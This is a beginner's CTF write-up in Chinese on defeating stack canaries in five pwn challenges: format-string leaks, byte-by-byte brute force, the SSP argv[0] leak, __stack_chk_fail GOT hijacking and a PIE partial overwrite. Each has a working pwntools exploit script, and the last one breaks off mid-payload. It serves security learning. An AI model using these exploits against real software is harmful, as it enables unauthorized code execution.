这是做栈的题目遇到的各种有关于canary的操作，适合萌新收藏，大佬们请出门右拐，谢谢~  
题目都在附件中，下面直接开始介绍吧。
### 题目1：bin
#### 方法介绍：leak canary
利用格式化字符串漏洞，泄露出canary的值，然后填到canary相应的位置从而绕过保护实现栈溢出。
#### 开始分析：
常规操作，先checksec下，再ida静态分析
很明显有格式化字符串漏洞和栈溢出漏洞，但是开了栈溢出保护，程序有2个输入，第一次输入可以先泄露cananry，第二次直接覆盖canary就可以栈溢出了，简单明了，gdb动态调试，可以看到canary在格式化字符串的偏移为7，  
在第二个次输入中，我们需要输入到canary进行覆盖工作，这是可以看ida：  
可以知道0x70-0xC = 0x64=100，那么就是说要覆盖100个字符才到canary的位置，这样就可以栈溢出了，跳转到这里即可：  
EXP的payload：
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal','-x','bash','-c']
    context(arch='i386', os='linux')#arch也可以是i386~看文件
    local = 1
    elf = ELF('./bin')
    #标志位,0和１
    if local:
        p = process('./bin')
        libc = elf.libc
    else:
        p = remote('',)
        libc = ELF('./')
    payload = '%7$x'
    p.sendline(payload)
    canary = int(p.recv(),16)
    print canary 
    getflag = 0x0804863B
    payload = 'a'*100 + p32(canary) + 'a'*12 + p32(getflag)
    p.send(payload)
    p.interactive()
### 题目2：bin1
#### 方法介绍：爆破canary
利用fork进程特征，canary的不变性，通过循环爆破canary的每一位
#### 开始分析：
有栈溢出漏洞，但是开启了栈溢出保护，又因为是线程，联想到爆破法，这题的canary地址和上题一样，先覆盖100位，再填，我们知道程序的canary的最后一位是0，所以可以一个一个地跑。  
因为canary有4位，最后一位是\x00，所以还要循环3次，每一次从256（ASCII码范围）中取，有合适的+1，没有继续循环，直到跑出来，这是32位的情况，64位的话爆破7位。  
最后栈溢出绕过直接执行那个函数。
payload：
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal','-x','bash','-c']
    context(arch='i386', os='linux')#arch也可以是i386~看文件
    local = 1
    elf = ELF('./bin1')
    #标志位,0和１
    if local:
        p = process('./bin1')
        libc = elf.libc
    else:
        p = remote('',)
        libc = ELF('./')
    p.recvuntil('welcome\n')
    canary = '\x00'
    for i in range(3):
        for i in range(256):
            p.send('a'*100 + canary + chr(i))
            a = p.recvuntil("welcome\n")
            if "recv" in a:
                canary += chr(i)
                break
    getflag = 0x0804863B
    payload = 'a'*100 + canary + 'a'*12 + p32(getflag)
    p.sendline(payload)
    p.interactive()
### 题目3：bin2(原题是OJ的smashes)
#### 方法介绍：
ssp攻击：argv[0]是指向第一个启动参数字符串的指针，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值。
#### 开始分析：
这里介绍故意触发 **_stack_chk_fail：  
ssp攻击：argv[0]是指向第一个启动参数字符串的指针，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值，举个例子：  
但是我们不知道flag的位置在哪里，有个小技巧就是字符直接填充flag的位置，只要足够大，就一定能行，但是看看ida：  
发现被修改了值，所以是直接打印不出来的，这可怎么办才好，这里借助大佬的博客，说ELF的重映射，当可执行文件足够小的时候，他的不同区段可能会被多次映射。这道题就是这样。这个flag应该会被映射到多个地方，也就是有副本，只要找出副本地址即可，接下来去gdb里面找：找个地址下断点，寻找CTF字符串，看到0x400d20。  
这下直接写进去覆盖就好啦：  
payload：**
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal','-x','bash','-c']
    context(arch='i386', os='linux')#arch也可以是i386~看文件
    local = 1
    elf = ELF('./bin2')
    #标志位,0和１
    if local:
        p = process('./bin2')
        libc = elf.libc
    else:
        p = remote('',)
        libc = ELF('./')
    flag = 0x400d20
    payload = ""
    payload += p64(flag)*1000
    p.recvuntil("Hello!\nWhat's your name?")
    p.sendline(payload)
    p.recv()
    p.sendline(payload)
    p.interactive()
验收：  
如果说老老实实做也是可以的，先看看那个argv[0]在栈中的位置：
然后看看我们的输入esp到它的距离：
计算下地址差值：0x218的偏移，所以直接：
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal','-x','bash','-c']
    context(arch='i386', os='linux')#arch也可以是i386~看文件
    local = 1
    elf = ELF('./bin2')
    #标志位,0和１
    if local:
        p = process('./bin2')
        libc = elf.libc
    else:
        p = remote('',)
        libc = ELF('./')
    flag = 0x400d20
    payload = ""
    #payload += p64(flag)*1000
    payload += 0x218*'a' + p64(flag)
    p.recvuntil("Hello!\nWhat's your name?")
    p.sendline(payload)
    p.recv()
    p.sendline(payload)
    p.interactive()
验收：
### 题目4：bin3（原题是hgame的week2的Steins）
#### 方法介绍：
劫持 **stack_chk_fail函数，控制程序流程，也就是说刚开始未栈溢出时，我们先改写**
stack_chk_fail的got表指针内容为我们的后门函数地址，之后我们故意制造栈溢出调用
**stack_chk_fail时，实际就是执行我们的后门函数。**
#### 开始分析：
栈溢出保护，堆栈不可执行，格式化字符串漏洞，这里一开始真的没有什么思路，后来师傅给了提示：  
劫持 **stack_chk_fail函数，控制程序流程，也就是说刚开始未栈溢出时，我们先改写**
stack_chk_fail的got表内容为我们的后门函数地址，之后我们故意制造栈溢出调用__stack_chk_fail时，实际就是执行我们的后门函数。
payload：
    #coding=utf8
    from pwn import *
    context.log_level='debug'
    elf = ELF('./babyfmtt')
    p = process('./babyfmtt')
    libc = elf.libc
    system_addr = 0x40084E
    stack_fail = elf.got['__stack_chk_fail']
    payload = ''
    payload += 'a'*5 + '%' + str(system_addr & 0xffff - 5) + 'c%8$hn' + p64(stack_fail) + 'a'*100
    #gdb.attach(p,'b *0x04008DB')
    p.recv()
    p.sendline(payload)
    p.interactive()
成功：  
### 题目5：bin4
babypie
#### 开始分析：
栈溢出保护，堆栈不可执行，堆栈不可写，只有got可以改，看逻辑，先输入名字到buf，刚好0x30的大小，这里马上想到泄露canary，因为后面有个printf函数，第二次输入有栈溢出漏洞（前提是绕过了栈溢出保护了），看看有没有可以getshell的函数：
随机化地址0xA3E可以直接getshell，很好，就跳转到这里吧。
#### 大体思路：
1、因为canary的低位是\x00截断符，先用\x01去覆盖这个低位，然后打印出来后面的7位，最后加上\x00即可
2、通过填充canary实现栈溢出，跳到那个0xA3E函数处，由于随机化的地址，所以第四位不知道怎么搞，这里直接爆破第四位即可
EXP如下：
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal','-x','bash','-c']
    context(arch='amd64', os='linux')
    #arch也可以是i386~看文件
    local = 1
    elf = ELF('./babypie')
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    while True:
        if local:
            p = process('./babypie')
            libc = elf.libc
        else:
            p = remote('',)
            libc = ELF('./')
            #第一次调用尝试调用
        system_addr = '\x3E\x0A'
        payload = ''
        payload += 'a'*0x28 +'\x01'